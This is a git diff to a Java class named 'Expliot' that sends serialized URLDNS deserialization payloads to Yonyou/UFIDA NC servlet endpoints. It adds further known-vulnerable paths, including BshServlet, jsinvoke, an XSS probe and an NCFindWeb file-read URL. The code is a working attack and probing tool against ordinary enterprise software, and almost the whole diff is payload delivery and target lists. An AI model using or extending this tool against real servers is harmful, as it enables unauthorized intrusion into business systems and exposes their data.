@@ -46,14 +46,21 @@ public class Expliot {
         connection.setConnectTimeout(10000);
         connection.setReadTimeout(10000);
         connection.setDoOutput(true);
+       
         if (servletname.equals("ActionHandlerServlet")) {
         	GZIPOutputStream gzip = new GZIPOutputStream(connection.getOutputStream());
         	gzip.write(Gzipbs.tobytes(Urldns.exec(dnslog)));
         	gzip.close();
+		} else if (servletname.equals("jsinvoke")) {
+			
+			
+			
 		} else {
 	        ObjectOutputStream oos = new ObjectOutputStream(connection.getOutputStream());
 	        oos.writeObject(Urldns.exec(dnslog));
 		}
+        
+
         connection.connect();
         connection.getResponseCode();
 	}
@@ -76,7 +83,14 @@ public class Expliot {
 		servlet.put("UploadServlet", "servlet/~ic/nc.document.pub.fileSystem.servlet.UploadServlet");
 		servlet.put("DeleteServlet", "servlet/~ic/nc.document.pub.fileSystem.servlet.DeleteServlet");
 		servlet.put("ActionHandlerServlet", "servlet/~ic/com.ufida.zior.console.ActionHandlerServlet");
+		servlet.put("NCMessageServlet", "servlet/~baseapp/nc.message.bs.NCMessageServlet");
 		servlet.put("ServiceDispatcherServlet", "ServiceDispatcherServlet");
+		servlet.put("BshServlet", "servlet/~ic/bsh.servlet.BshServlet");
+		servlet.put("jsinvoke", "uapjs/jsinvoke/?action=invoke");
+		servlet.put("ShowAlertFileServlet", "servlet/~ic/ShowAlertFileServlet");
+		servlet.put("errorXSS", "uapws/pages/error.jsp?msg=<img%20src=1>");
+		servlet.put("UpdateService", "uapws/service/nc.uap.oba.update.IUpdateService?wsdl");
+		servlet.put("IPreAlertConfigService", "NCFindWeb?service=IPreAlertConfigService&filename=");
 		return servlet;
 	}
 	private static void trustAllHttpsCertificates() throws Exception {
